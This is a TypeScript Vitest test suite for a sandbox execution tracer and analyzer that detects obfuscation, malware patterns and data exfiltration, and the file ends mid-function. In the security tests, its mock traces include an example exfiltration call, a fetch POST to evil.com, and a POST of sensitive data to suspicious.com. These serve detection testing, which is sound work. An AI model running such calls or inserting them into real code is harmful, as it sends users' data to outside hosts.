/**
 * @fileoverview Comprehensive tests for execution tracing system (tracer.ts)
 * 
 * Tests execution trace recording, call stack tracking, variable access monitoring,
 * performance metrics collection, trace analysis, and reporting capabilities.
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import {
  ExecutionTracer,
  TraceAnalyzer,
  TraceRecorder,
  TraceEventCollector,
  type ExecutionTrace,
  type TraceEntry,
  type TraceAnalysis,
  type TraceOptions,
} from '../../src/sandbox/tracer.js';

describe('Execution Tracing System (tracer.ts)', () => {
  let tracer: ExecutionTracer;
  let analyzer: TraceAnalyzer;
  let recorder: TraceRecorder;

  beforeEach(() => {
    tracer = new ExecutionTracer({
      enableCallTracing: true,
      enableVariableTracking: true,
      enablePerformanceMetrics: true,
      maxTraceEntries: 10000,
      enableStackTracking: true,
    });
    analyzer = new TraceAnalyzer();
    recorder = new TraceRecorder();
  });

  afterEach(() => {
    if (tracer) {
      tracer.cleanup();
    }
    if (analyzer) {
      analyzer.cleanup();
    }
    if (recorder) {
      recorder.cleanup();
    }
  });

  describe('ExecutionTracer', () => {
    describe('Trace Configuration', () => {
      it('should initialize with correct configuration', () => {
        const config = tracer.getConfiguration();
        
        expect(config.enableCallTracing).toBe(true);
        expect(config.enableVariableTracking).toBe(true);
        expect(config.enablePerformanceMetrics).toBe(true);
        expect(config.maxTraceEntries).toBe(10000);
        expect(config.enableStackTracking).toBe(true);
      });

      it('should allow configuration updates', () => {
        tracer.updateConfiguration({
          enableCallTracing: false,
          maxTraceEntries: 5000,
        });

        const config = tracer.getConfiguration();
        expect(config.enableCallTracing).toBe(false);
        expect(config.maxTraceEntries).toBe(5000);
        expect(config.enableVariableTracking).toBe(true); // Should remain unchanged
      });

      it('should validate configuration parameters', () => {
        expect(() => {
          tracer.updateConfiguration({
            maxTraceEntries: -1,
          });
        }).toThrow(/invalid.*configuration/i);

        expect(() => {
          tracer.updateConfiguration({
            maxTraceEntries: 0,
          });
        }).toThrow(/invalid.*configuration/i);
      });
    });

    describe('Function Call Tracing', () => {
      it('should record function entry and exit', () => {
        tracer.startTracing();
        
        tracer.recordFunctionEntry('testFunction', ['arg1', 'arg2']);
        tracer.recordFunctionExit('testFunction', 'return value');
        
        const trace = tracer.getTrace();
        
        expect(trace.entries).toHaveLength(2);
        expect(trace.entries[0].type).toBe('function_entry');
        expect(trace.entries[0].data.functionName).toBe('testFunction');
        expect(trace.entries[0].data.arguments).toEqual(['arg1', 'arg2']);
        expect(trace.entries[1].type).toBe('function_exit');
        expect(trace.entries[1].data.returnValue).toBe('return value');
      });

      it('should track nested function calls', () => {
        tracer.startTracing();
        
        tracer.recordFunctionEntry('outer', []);
        tracer.recordFunctionEntry('inner', ['nested']);
        tracer.recordFunctionExit('inner', 'inner result');
        tracer.recordFunctionExit('outer', 'outer result');
        
        const trace = tracer.getTrace();
        
        expect(trace.entries).toHaveLength(4);
        expect(trace.callStack.maxDepth).toBe(2);
      });

      it('should handle recursive function calls', () => {
        tracer.startTracing();
        
        // Simulate recursive calls
        for (let depth = 1; depth <= 5; depth++) {
          tracer.recordFunctionEntry('recursive', [depth]);
        }
        
        for (let depth = 5; depth >= 1; depth--) {
          tracer.recordFunctionExit('recursive', depth - 1);
        }
        
        const trace = tracer.getTrace();
        
        expect(trace.callStack.maxDepth).toBe(5);
        expect(trace.stats.totalFunctionCalls).toBe(5);
      });

      it('should track function execution time', () => {
        tracer.startTracing();
        
        tracer.recordFunctionEntry('timedFunction', []);
        
        // Simulate some execution time
        const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
        
        setTimeout(() => {
          tracer.recordFunctionExit('timedFunction', 'result');
        }, 10);
        
        setTimeout(() => {
          const trace = tracer.getTrace();
          const exitEntry = trace.entries.find(e => e.type === 'function_exit');
          
          expect(exitEntry?.data.executionTime).toBeGreaterThan(0);
          expect(exitEntry?.data.executionTime).toBeLessThan(50);
        }, 50);
      });

      it('should handle unbalanced function calls', () => {
        tracer.startTracing();
        
        tracer.recordFunctionEntry('function1', []);
        tracer.recordFunctionEntry('function2', []);
        // Missing exit for function2
        tracer.recordFunctionExit('function1', 'result');
        
        const trace = tracer.getTrace();
        
        expect(trace.warnings).toContain(
          expect.stringMatching(/unbalanced.*call/i)
        );
      });
    });

    describe('Variable Access Tracking', () => {
      it('should record variable reads', () => {
        tracer.startTracing();
        
        tracer.recordVariableRead('testVar', 'test value');
        tracer.recordVariableRead('counter', 42);
        
        const trace = tracer.getTrace();
        
        expect(trace.variableAccess.reads.get('testVar')).toBe(1);
        expect(trace.variableAccess.reads.get('counter')).toBe(1);
        expect(trace.variableAccess.values.get('testVar')).toBe('test value');
        expect(trace.variableAccess.values.get('counter')).toBe(42);
      });

      it('should record variable writes', () => {
        tracer.startTracing();
        
        tracer.recordVariableWrite('testVar', 'old value', 'new value');
        tracer.recordVariableWrite('counter', 0, 1);
        
        const trace = tracer.getTrace();
        
        expect(trace.variableAccess.writes.get('testVar')).toBe(1);
        expect(trace.variableAccess.writes.get('counter')).toBe(1);
        expect(trace.variableAccess.values.get('testVar')).toBe('new value');
        expect(trace.variableAccess.values.get('counter')).toBe(1);
      });

      it('should track variable access patterns', () => {
        tracer.startTracing();
        
        // Simulate multiple accesses
        tracer.recordVariableRead('loopVar', 0);
        tracer.recordVariableWrite('loopVar', 0, 1);
        tracer.recordVariableRead('loopVar', 1);
        tracer.recordVariableWrite('loopVar', 1, 2);
        tracer.recordVariableRead('loopVar', 2);
        
        const trace = tracer.getTrace();
        
        expect(trace.variableAccess.reads.get('loopVar')).toBe(3);
        expect(trace.variableAccess.writes.get('loopVar')).toBe(2);
        expect(trace.stats.totalVariableAccesses).toBe(5);
      });

      it('should handle complex data types', () => {
        tracer.startTracing();
        
        const complexObject = {
          number: 42,
          string: 'test',
          array: [1, 2, 3],
          nested: { prop: 'value' }
        };
        
        tracer.recordVariableRead('complexVar', complexObject);
        
        const trace = tracer.getTrace();
        
        expect(trace.variableAccess.values.get('complexVar')).toEqual(complexObject);
      });

      it('should detect potential memory leaks', () => {
        tracer.startTracing();
        
        // Simulate accumulating array
        const largeArray = [];
        for (let i = 0; i < 1000; i++) {
          largeArray.push(`item${i}`);
          tracer.recordVariableWrite('accumulator', largeArray, [...largeArray]);
        }
        
        const trace = tracer.getTrace();
        const analysis = analyzer.analyze(trace);
        
        expect(analysis.potentialIssues).toContain(
          expect.stringMatching(/memory.*leak|growing.*variable/i)
        );
      });
    });

    describe('Performance Metrics Collection', () => {
      it('should collect execution time metrics', async () => {
        tracer.startTracing();
        
        const startTime = tracer.recordExecutionStart();
        
        // Simulate some work
        await new Promise(resolve => setTimeout(resolve, 20));
        
        tracer.recordExecutionEnd(startTime);
        
        const trace = tracer.getTrace();
        
        expect(trace.performance.executionTime).toBeGreaterThan(15);
        expect(trace.performance.executionTime).toBeLessThan(50);
      });

      it('should track memory usage', () => {
        tracer.startTracing();
        
        tracer.recordMemoryUsage(1024 * 1024); // 1MB
        tracer.recordMemoryUsage(2 * 1024 * 1024); // 2MB
        tracer.recordMemoryUsage(1.5 * 1024 * 1024); // 1.5MB
        
        const trace = tracer.getTrace();
        
        expect(trace.performance.peakMemoryMB).toBe(2);
        expect(trace.performance.finalMemoryMB).toBe(1.5);
      });

      it('should measure operation frequencies', () => {
        tracer.startTracing();
        
        // Record various operations
        for (let i = 0; i < 100; i++) {
          tracer.recordOperation('loop_iteration');
        }
        
        for (let i = 0; i < 50; i++) {
          tracer.recordOperation('string_concat');
        }
        
        for (let i = 0; i < 25; i++) {
          tracer.recordOperation('array_push');
        }
        
        const trace = tracer.getTrace();
        
        expect(trace.performance.operationCounts.get('loop_iteration')).toBe(100);
        expect(trace.performance.operationCounts.get('string_concat')).toBe(50);
        expect(trace.performance.operationCounts.get('array_push')).toBe(25);
      });

      it('should profile function performance', () => {
        tracer.startTracing();
        
        tracer.recordFunctionEntry('fastFunction', []);
        tracer.recordFunctionExit('fastFunction', 'result', 5);
        
        tracer.recordFunctionEntry('slowFunction', []);
        tracer.recordFunctionExit('slowFunction', 'result', 50);
        
        const trace = tracer.getTrace();
        
        expect(trace.performance.functionProfiles.get('fastFunction')?.averageTime).toBe(5);
        expect(trace.performance.functionProfiles.get('slowFunction')?.averageTime).toBe(50);
      });
    });

    describe('Stack Tracking', () => {
      it('should maintain accurate call stack', () => {
        tracer.startTracing();
        
        tracer.recordFunctionEntry('level1', []);
        expect(tracer.getCurrentStackDepth()).toBe(1);
        
        tracer.recordFunctionEntry('level2', []);
        expect(tracer.getCurrentStackDepth()).toBe(2);
        
        tracer.recordFunctionEntry('level3', []);
        expect(tracer.getCurrentStackDepth()).toBe(3);
        
        tracer.recordFunctionExit('level3', 'result');
        expect(tracer.getCurrentStackDepth()).toBe(2);
        
        tracer.recordFunctionExit('level2', 'result');
        expect(tracer.getCurrentStackDepth()).toBe(1);
        
        tracer.recordFunctionExit('level1', 'result');
        expect(tracer.getCurrentStackDepth()).toBe(0);
      });

      it('should provide current call stack', () => {
        tracer.startTracing();
        
        tracer.recordFunctionEntry('main', []);
        tracer.recordFunctionEntry('helper', []);
        tracer.recordFunctionEntry('utility', []);
        
        const stack = tracer.getCurrentCallStack();
        
        expect(stack).toEqual(['main', 'helper', 'utility']);
      });

      it('should detect potential stack overflow', () => {
        tracer.startTracing();
        
        // Simulate deep recursion
        for (let i = 0; i < 1000; i++) {
          tracer.recordFunctionEntry(`recursive_${i}`, []);
        }
        
        const trace = tracer.getTrace();
        
        expect(trace.warnings).toContain(
          expect.stringMatching(/deep.*recursion|stack.*overflow/i)
        );
      });
    });

    describe('String and Constant Tracking', () => {
      it('should track decoded strings', () => {
        tracer.startTracing();
        
        tracer.recordStringDecoding('\\x48\\x65\\x6c\\x6c\\x6f', 'Hello');
        tracer.recordStringDecoding('dGVzdA==', 'test');
        
        const trace = tracer.getTrace();
        
        expect(trace.decodedStrings).toContain('Hello');
        expect(trace.decodedStrings).toContain('test');
        expect(trace.stats.totalStringDecodings).toBe(2);
      });

      it('should collect constants', () => {
        tracer.startTracing();
        
        tracer.recordConstant('42');
        tracer.recordConstant('"hello world"');
        tracer.recordConstant('true');
        tracer.recordConstant('3.14159');
        
        const trace = tracer.getTrace();
        
        expect(trace.constants.has('42')).toBe(true);
        expect(trace.constants.has('"hello world"')).toBe(true);
        expect(trace.constants.has('true')).toBe(true);
        expect(trace.constants.has('3.14159')).toBe(true);
        expect(trace.constants.size).toBe(4);
      });

      it('should track string operations', () => {
        tracer.startTracing();
        
        tracer.recordStringOperation('concat', 'hello', 'world', 'hello world');
        tracer.recordStringOperation('slice', 'testing', '0,4', 'test');
        tracer.recordStringOperation('replace', 'abc 123', '123,xyz', 'abc xyz');
        
        const trace = tracer.getTrace();
        
        expect(trace.stats.totalStringOperations).toBe(3);
        expect(trace.stringOperations).toContain(
          expect.objectContaining({
            operation: 'concat',
            inputs: ['hello', 'world'],
            output: 'hello world'
          })
        );
      });
    });

    describe('Trace Management', () => {
      it('should limit trace entries to prevent memory issues', () => {
        const limitedTracer = new ExecutionTracer({
          maxTraceEntries: 10,
        });
        
        limitedTracer.startTracing();
        
        // Add more entries than the limit
        for (let i = 0; i < 20; i++) {
          limitedTracer.recordOperation(`operation_${i}`);
        }
        
        const trace = limitedTracer.getTrace();
        
        expect(trace.entries.length).toBeLessThanOrEqual(10);
        expect(trace.warnings).toContain(
          expect.stringMatching(/trace.*limit.*reached/i)
        );
        
        limitedTracer.cleanup();
      });

      it('should support trace snapshots', () => {
        tracer.startTracing();
        
        tracer.recordOperation('op1');
        tracer.recordOperation('op2');
        
        const snapshot1 = tracer.takeSnapshot();
        
        tracer.recordOperation('op3');
        tracer.recordOperation('op4');
        
        const snapshot2 = tracer.takeSnapshot();
        
        expect(snapshot1.entries.length).toBe(2);
        expect(snapshot2.entries.length).toBe(4);
      });

      it('should handle trace pausing and resuming', () => {
        tracer.startTracing();
        
        tracer.recordOperation('before_pause');
        
        tracer.pauseTracing();
        tracer.recordOperation('during_pause'); // Should not be recorded
        
        tracer.resumeTracing();
        tracer.recordOperation('after_resume');
        
        const trace = tracer.getTrace();
        
        expect(trace.entries).toHaveLength(2);
        expect(trace.entries[0].data.operation).toBe('before_pause');
        expect(trace.entries[1].data.operation).toBe('after_resume');
      });

      it('should provide trace statistics', () => {
        tracer.startTracing();
        
        // Generate various activities
        tracer.recordFunctionEntry('func1', []);
        tracer.recordFunctionEntry('func2', []);
        tracer.recordVariableRead('var1', 'value');
        tracer.recordVariableWrite('var2', 'old', 'new');
        tracer.recordStringDecoding('encoded', 'decoded');
        tracer.recordConstant('42');
        
        const trace = tracer.getTrace();
        
        expect(trace.stats.totalFunctionCalls).toBe(2);
        expect(trace.stats.totalVariableAccesses).toBe(2);
        expect(trace.stats.totalStringDecodings).toBe(1);
        expect(trace.stats.uniqueConstants).toBe(1);
        expect(trace.stats.totalEntries).toBeGreaterThan(0);
      });
    });
  });

  describe('TraceAnalyzer', () => {
    describe('Obfuscation Detection', () => {
      it('should detect basic obfuscation patterns', () => {
        const mockTrace: ExecutionTrace = {
          entries: [
            {
              timestamp: Date.now(),
              type: 'string_operation',
              data: { operation: 'String.fromCharCode', inputs: ['72', '101', '108'], output: 'Hel' }
            },
            {
              timestamp: Date.now(),
              type: 'eval_call',
              data: { code: 'console.log("decoded")' }
            }
          ],
          constants: new Set(['72', '101', '108', '108', '111']),
          decodedStrings: ['Hello'],
          stats: {
            totalStringOperations: 5,
            totalStringDecodings: 1,
            totalFunctionCalls: 2,
            totalVariableAccesses: 3,
            uniqueConstants: 5,
            totalEntries: 10,
          },
          stringOperations: [],
          variableAccess: { reads: new Map(), writes: new Map(), values: new Map() },
          callStack: { maxDepth: 2, current: [] },
          performance: { executionTime: 50, peakMemoryMB: 4, finalMemoryMB: 2 },
          warnings: [],
        };

        const analysis = analyzer.analyze(mockTrace);

        expect(analysis.obfuscationLevel).toBeGreaterThan(20);
        expect(analysis.techniques).toContain('string_from_char_code');
        expect(analysis.techniques).toContain('eval_usage');
        expect(analysis.deobfuscationOpportunities).toContain(
          expect.stringMatching(/string.*decode|char.*code/i)
        );
      });

      it('should calculate complexity scores', () => {
        const simpleTrace: ExecutionTrace = {
          entries: [],
          constants: new Set(['1', '2', '3']),
          decodedStrings: [],
          stats: {
            totalStringOperations: 0,
            totalStringDecodings: 0,
            totalFunctionCalls: 1,
            totalVariableAccesses: 2,
            uniqueConstants: 3,
            totalEntries: 3,
          },
          stringOperations: [],
          variableAccess: { reads: new Map(), writes: new Map(), values: new Map() },
          callStack: { maxDepth: 1, current: [] },
          performance: { executionTime: 10, peakMemoryMB: 1, finalMemoryMB: 1 },
          warnings: [],
        };

        const complexTrace: ExecutionTrace = {
          ...simpleTrace,
          constants: new Set(Array.from({ length: 100 }, (_, i) => i.toString())),
          stats: {
            ...simpleTrace.stats,
            totalStringOperations: 50,
            totalStringDecodings: 10,
            uniqueConstants: 100,
          },
          decodedStrings: Array.from({ length: 10 }, (_, i) => `decoded_${i}`),
        };

        const simpleAnalysis = analyzer.analyze(simpleTrace);
        const complexAnalysis = analyzer.analyze(complexTrace);

        expect(complexAnalysis.obfuscationLevel).toBeGreaterThan(simpleAnalysis.obfuscationLevel);
        expect(complexAnalysis.complexity).toBeGreaterThan(simpleAnalysis.complexity);
      });

      it('should identify specific obfuscation techniques', () => {
        const techniques = [
          { pattern: 'base64', trace: createMockTraceWithBase64() },
          { pattern: 'hex_encoding', trace: createMockTraceWithHex() },
          { pattern: 'string_array', trace: createMockTraceWithStringArray() },
          { pattern: 'control_flow', trace: createMockTraceWithControlFlow() },
        ];

        techniques.forEach(({ pattern, trace }) => {
          const analysis = analyzer.analyze(trace);
          expect(analysis.techniques).toContain(pattern);
        });
      });

      it('should suggest deobfuscation strategies', () => {
        const stringArrayTrace = createMockTraceWithStringArray();
        const analysis = analyzer.analyze(stringArrayTrace);

        expect(analysis.deobfuscationOpportunities).toContain(
          expect.stringMatching(/string.*array|constant.*replacement/i)
        );
        expect(analysis.recommendations).toContain(
          expect.stringMatching(/extract.*constants/i)
        );
      });
    });

    describe('Performance Analysis', () => {
      it('should identify performance bottlenecks', () => {
        const slowTrace: ExecutionTrace = {
          entries: [],
          constants: new Set(),
          decodedStrings: [],
          stats: {
            totalStringOperations: 1000,
            totalStringDecodings: 0,
            totalFunctionCalls: 10,
            totalVariableAccesses: 5000,
            uniqueConstants: 10,
            totalEntries: 100,
          },
          stringOperations: [],
          variableAccess: { reads: new Map([['loopVar', 5000]]), writes: new Map(), values: new Map() },
          callStack: { maxDepth: 10, current: [] },
          performance: {
            executionTime: 5000,
            peakMemoryMB: 128,
            finalMemoryMB: 64,
            operationCounts: new Map([['string_concat', 1000]]),
            functionProfiles: new Map([['slowFunction', { calls: 1, totalTime: 4000, averageTime: 4000 }]]),
          },
          warnings: [],
        };

        const analysis = analyzer.analyze(slowTrace);

        expect(analysis.performanceIssues).toContain(
          expect.stringMatching(/slow.*execution|performance.*issue/i)
        );
        expect(analysis.potentialIssues).toContain(
          expect.stringMatching(/memory.*usage|excessive.*operations/i)
        );
      });

      it('should analyze resource usage patterns', () => {
        const resourceIntensiveTrace: ExecutionTrace = {
          entries: [],
          constants: new Set(),
          decodedStrings: [],
          stats: {
            totalStringOperations: 0,
            totalStringDecodings: 0,
            totalFunctionCalls: 1,
            totalVariableAccesses: 1,
            uniqueConstants: 1,
            totalEntries: 1,
          },
          stringOperations: [],
          variableAccess: { reads: new Map(), writes: new Map(), values: new Map() },
          callStack: { maxDepth: 200, current: [] },
          performance: {
            executionTime: 100,
            peakMemoryMB: 256,
            finalMemoryMB: 256,
          },
          warnings: ['Deep recursion detected'],
        };

        const analysis = analyzer.analyze(resourceIntensiveTrace);

        expect(analysis.riskLevel).toBe('high');
        expect(analysis.potentialIssues).toContain(
          expect.stringMatching(/memory.*usage|deep.*recursion/i)
        );
      });
    });

    describe('Security Analysis', () => {
      it('should identify security concerns', () => {
        const suspiciousTrace: ExecutionTrace = {
          entries: [
            {
              timestamp: Date.now(),
              type: 'eval_call',
              data: { code: 'fetch("https://evil.com/exfiltrate", {method: "POST"})' }
            },
            {
              timestamp: Date.now(),
              type: 'function_call',
              data: { functionName: 'btoa', arguments: ['sensitive data'] }
            }
          ],
          constants: new Set(),
          decodedStrings: ['https://evil.com/exfiltrate'],
          stats: {
            totalStringOperations: 2,
            totalStringDecodings: 1,
            totalFunctionCalls: 2,
            totalVariableAccesses: 0,
            uniqueConstants: 0,
            totalEntries: 2,
          },
          stringOperations: [],
          variableAccess: { reads: new Map(), writes: new Map(), values: new Map() },
          callStack: { maxDepth: 1, current: [] },
          performance: { executionTime: 50, peakMemoryMB: 2, finalMemoryMB: 1 },
          warnings: [],
        };

        const analysis = analyzer.analyze(suspiciousTrace);

        expect(analysis.securityConcerns).toContain(
          expect.stringMatching(/dynamic.*code|network.*request/i)
        );
        expect(analysis.riskLevel).toBe('high');
      });

      it('should detect potential data exfiltration', () => {
        const exfiltrationTrace = createMockTraceWithNetworkActivity();
        const analysis = analyzer.analyze(exfiltrationTrace);

        expect(analysis.securityConcerns).toContain(
          expect.stringMatching(/network.*activity|data.*exfiltration/i)
        );
        expect(analysis.recommendations).toContain(
          expect.stringMatching(/block.*network|monitor.*requests/i)
        );
      });
    });

    describe('Pattern Recognition', () => {
      it('should recognize common malware patterns', () => {
        const malwareTrace = createMockMalwareTrace();
        const analysis = analyzer.analyze(malwareTrace);

        expect(analysis.techniques).toContain('obfuscation');
        expect(analysis.techniques).toContain('anti_debug');
        expect(analysis.malwareIndicators).toContain(
          expect.stringMatching(/packed.*code|anti.*analysis/i)
        );
      });

      it('should identify legitimate vs suspicious patterns', () => {
        const legitimateTrace = createMockLegitimateTrace();
        const suspiciousTrace = createMockSuspiciousTrace();

        const legitimateAnalysis = analyzer.analyze(legitimateTrace);
        const suspiciousAnalysis = analyzer.analyze(suspiciousTrace);

        expect(legitimateAnalysis.riskLevel).toBe('low');
        expect(suspiciousAnalysis.riskLevel).toBe('high');
        expect(suspiciousAnalysis.securityConcerns.length).toBeGreaterThan(
          legitimateAnalysis.securityConcerns.length
        );
      });
    });
  });

  describe('TraceRecorder', () => {
    describe('Trace Recording', () => {
      it('should record traces to file', async () => {
        const mockTrace: ExecutionTrace = {
          entries: [
            {
              timestamp: Date.now(),
              type: 'function_call',
              data: { functionName: 'test', arguments: [] }
            }
          ],
          constants: new Set(['test']),
          decodedStrings: [],
          stats: {
            totalStringOperations: 0,
            totalStringDecodings: 0,
            totalFunctionCalls: 1,
            totalVariableAccesses: 0,
            uniqueConstants: 1,
            totalEntries: 1,
          },
          stringOperations: [],
          variableAccess: { reads: new Map(), writes: new Map(), values: new Map() },
          callStack: { maxDepth: 1, current: [] },
          performance: { executionTime: 10, peakMemoryMB: 1, finalMemoryMB: 1 },
          warnings: [],
        };

        const filename = await recorder.saveTrace(mockTrace, 'test-trace');
        
        expect(filename).toMatch(/test-trace.*\.json$/);
        
        const loaded = await recorder.loadTrace(filename);
        expect(loaded.stats.totalFunctionCalls).toBe(1);
        expect(loaded.constants.has('test')).toBe(true);
      });

      it('should handle trace compression', async () => {
        const largeTrace = createLargeTrace();
        
        const uncompressedFilename = await recorder.saveTrace(largeTrace, 'large-uncompressed', { compress: false });
        const compressedFilename = await recorder.saveTrace(largeTrace, 'large-compressed', { compress: true });
        
        const uncompressedSize = await recorder.getFileSize(uncompressedFilename);
        const compressedSize = await recorder.getFileSize(compressedFilename);
        
        expect(compressedSize).toBeLessThan(uncompressedSize * 0.8); // At least 20% compression
      });

      it('should support trace metadata', async () => {
        const trace = createMockTrace();
        const metadata = {
          version: '1.0.0',
          timestamp: Date.now(),
          source: 'test-suite',
          tags: ['test', 'development'],
        };

        const filename = await recorder.saveTrace(trace, 'traced-with-metadata', { metadata });
        const loaded = await recorder.loadTrace(filename);
        
        expect(loaded.metadata).toEqual(metadata);
      });
    });

    describe('Trace Collection Management', () => {
      it('should manage trace collections', async () => {
        const traces = [
          createMockTrace('trace1'),
          createMockTrace('trace2'),
          createMockTrace('trace3'),
        ];

        const collectionId = await recorder.createCollection('test-collection');
        
        for (const trace of traces) {
          await recorder.addToCollection(collectionId, trace);
        }

        const collection = await recorder.getCollection(collectionId);
        
        expect(collection.traces).toHaveLength(3);
        expect(collection.name).toBe('test-collection');
      });

      it('should support trace searching', async () => {
        const traces = [
          createMockTrace('eval-trace', { hasEval: true }),
          createMockTrace('network-trace', { hasNetwork: true }),
          createMockTrace('clean-trace', { hasEval: false, hasNetwork: false }),
        ];

        const collectionId = await recorder.createCollection('searchable');
        
        for (const trace of traces) {
          await recorder.addToCollection(collectionId, trace);
        }

        const evalTraces = await recorder.searchTraces(collectionId, {
          hasEval: true,
        });

        const networkTraces = await recorder.searchTraces(collectionId, {
          hasNetwork: true,
        });

        expect(evalTraces).toHaveLength(1);
        expect(networkTraces).toHaveLength(1);
      });
    });
  });

  describe('Integration and Advanced Features', () => {
    it('should handle real-time trace analysis', async () => {
      const realTimeAnalyzer = new TraceAnalyzer({
        enableRealTimeAnalysis: true,
        analysisThreshold: 10, // Analyze every 10 entries
      });

      tracer.startTracing();
      tracer.onTraceUpdate((trace) => {
        if (trace.entries.length % 10 === 0) {
          const analysis = realTimeAnalyzer.analyze(trace);
          expect(analysis).toBeDefined();
        }
      });

      // Generate trace entries
      for (let i = 0; i < 25; i++) {
        tracer.recordOperation(`operation_${i}`);
      }

      realTimeAnalyzer.cleanup();
    });

    it('should support custom trace event collectors', () => {
      const customCollector = new TraceEventCollector({
        eventTypes: ['custom_event'],
        bufferSize: 100,
      });

      tracer.addEventCollector(customCollector);
      tracer.startTracing();

      tracer.recordCustomEvent('custom_event', { data: 'test' });
      tracer.recordCustomEvent('custom_event', { data: 'test2' });

      const events = customCollector.getEvents();
      expect(events).toHaveLength(2);
      expect(events[0].data.data).toBe('test');
    });

    it('should handle cleanup properly', () => {
      tracer.startTracing();
      
      tracer.recordFunctionEntry('test', []);
      tracer.recordVariable('var', 'value');
      
      expect(tracer.getTrace().entries.length).toBeGreaterThan(0);
      
      tracer.cleanup();
      
      // Should reset state
      expect(() => tracer.getTrace()).toThrow(/cleaned.*up/i);
    });
  });

  // Helper functions for creating mock traces
  function createMockTraceWithBase64(): ExecutionTrace {
    return {
      entries: [
        {
          timestamp: Date.now(),
          type: 'string_operation',
          data: { operation: 'atob', inputs: ['dGVzdA=='], output: 'test' }
        }
      ],
      constants: new Set(['dGVzdA==']),
      decodedStrings: ['test'],
      stats: {
        totalStringOperations: 1,
        totalStringDecodings: 1,
        totalFunctionCalls: 1,
        totalVariableAccesses: 0,
        uniqueConstants: 1,
        totalEntries: 1,
      },
      stringOperations: [],
      variableAccess: { reads: new Map(), writes: new Map(), values: new Map() },
      callStack: { maxDepth: 1, current: [] },
      performance: { executionTime: 10, peakMemoryMB: 1, finalMemoryMB: 1 },
      warnings: [],
    };
  }

  function createMockTraceWithHex(): ExecutionTrace {
    return {
      entries: [
        {
          timestamp: Date.now(),
          type: 'string_operation',
          data: { operation: 'String.fromCharCode', inputs: ['0x48', '0x65'], output: 'He' }
        }
      ],
      constants: new Set(['0x48', '0x65']),
      decodedStrings: ['He'],
      stats: {
        totalStringOperations: 1,
        totalStringDecodings: 1,
        totalFunctionCalls: 1,
        totalVariableAccesses: 0,
        uniqueConstants: 2,
        totalEntries: 1,
      },
      stringOperations: [],
      variableAccess: { reads: new Map(), writes: new Map(), values: new Map() },
      callStack: { maxDepth: 1, current: [] },
      performance: { executionTime: 10, peakMemoryMB: 1, finalMemoryMB: 1 },
      warnings: [],
    };
  }

  function createMockTraceWithStringArray(): ExecutionTrace {
    return {
      entries: [],
      constants: new Set(['0', '1', '2', '"hello"', '"world"', '"test"']),
      decodedStrings: [],
      stats: {
        totalStringOperations: 10,
        totalStringDecodings: 0,
        totalFunctionCalls: 5,
        totalVariableAccesses: 20,
        uniqueConstants: 6,
        totalEntries: 35,
      },
      stringOperations: [],
      variableAccess: {
        reads: new Map([['_0x1234', 10]]),
        writes: new Map([['_0x1234', 3]]),
        values: new Map([['_0x1234', ['hello', 'world', 'test']]])
      },
      callStack: { maxDepth: 2, current: [] },
      performance: { executionTime: 50, peakMemoryMB: 4, finalMemoryMB: 2 },
      warnings: [],
    };
  }

  function createMockTraceWithControlFlow(): ExecutionTrace {
    return {
      entries: [
        {
          timestamp: Date.now(),
          type: 'control_flow',
          data: { type: 'obfuscated_branch', condition: 'complex' }
        }
      ],
      constants: new Set(),
      decodedStrings: [],
      stats: {
        totalStringOperations: 0,
        totalStringDecodings: 0,
        totalFunctionCalls: 20,
        totalVariableAccesses: 5,
        uniqueConstants: 0,
        totalEntries: 25,
      },
      stringOperations: [],
      variableAccess: { reads: new Map(), writes: new Map(), values: new Map() },
      callStack: { maxDepth: 15, current: [] },
      performance: { executionTime: 100, peakMemoryMB: 8, finalMemoryMB: 4 },
      warnings: ['Complex control flow detected'],
    };
  }

  function createMockTraceWithNetworkActivity(): ExecutionTrace {
    return {
      entries: [
        {
          timestamp: Date.now(),
          type: 'network_request',
          data: { url: 'https://suspicious.com/collect', method: 'POST', data: 'sensitive' }
        }
      ],
      constants: new Set(),
      decodedStrings: ['https://suspicious.com/collect'],
      stats: {
        totalStringOperations: 1,
        totalStringDecodings: 1,
        totalFunctionCalls: 2,
        totalVariableAccesses: 1,
        uniqueConstants: 0,
        totalEntries: 4,
      },
      stringOperations: [],
      variableAccess: { reads: new Map(), writes: new Map(), values: new Map() },
      callStack: { maxDepth: 1, current: [] },
      performance: { executionTime: 30, peakMemoryMB: 2, finalMemoryMB: 1 },
      warnings: [],
    };
  }

  function createMockMalwareTrace(): ExecutionTrace {
    return {
      entries: [
        {
          timestamp: Date.now(),
          type: 'anti_debug',
          data: { technique: 'debugger_detection' }
        },
        {
          timestamp: Date.now(),
          type: 'packer',
          data: { technique: 'runtime_unpacking' }
        }
      ],
      constants: new Set(),
      decodedStrings: ['packed_payload_data'],
      stats: {
        totalStringOperations: 20,
        totalStringDecodings: 5,
        totalFunctionCalls: 50,
        totalVariableAccesses: 100,
        uniqueConstants: 50,
        totalEntries: 175,
      },
      stringOperations: [],
      variableAccess: { reads: new Map(), writes: new Map(), values: new Map() },
      callStack: { maxDepth: 10, current: [] },
      performance: { executionTime: 500, peakMemoryMB: 32, finalMemoryMB: 16 },
      warnings: ['Anti-debug techniques detected', 'Runtime unpacking detected'],
    };
  }

  function createMockLegitimateTrace(): ExecutionTrace {
    return {
      entries: [],
      constants: new Set(['1', '2', 'hello', 'world']),
      decodedStrings: [],
      stats: {
        totalStringOperations: 2,
        totalStringDecodings: 0,
        totalFunctionCalls: 5,
        totalVariableAccesses: 10,
        uniqueConstants: 4,
        totalEntries: 17,
      },
      stringOperations: [],
      variableAccess: { reads: new Map(), writes: new Map(), values: new Map() },
      callStack: { maxDepth: 3, current: [] },
      performance: { executionTime: 20, peakMemoryMB: 2, finalMemoryMB: 1 },
      warnings: [],
    };
  }

  function createMockSuspiciousTrace(): ExecutionTrace {
    return {
      entries: [
        {
          timestamp: Date.now(),
          type: 'eval_call',
          data: { code: 'dynamically_generated_code' }
        }
      ],
      constants: new Set(['72', '101', '108', '108', '111']),
      decodedStrings: ['Hello', 'decoded_string'],
      stats: {
        totalStringOperations: 15,
        totalStringDecodings: 8,
        totalFunctionCalls: 3,
        totalVariableAccesses: 5,
        uniqueConstants: 5,
        totalEntries: 31,
      },
      stringOperations: [],
      variableAccess: { reads: new Map(), writes: new Map(), values: new Map() },
      callStack: { maxDepth: 2, current: [] },
      performance: { executionTime: 100, peakMemoryMB: 8, finalMemoryMB: 4 },
      warnings: [],
    };
  }

  function createLargeTrace(): ExecutionTrace {
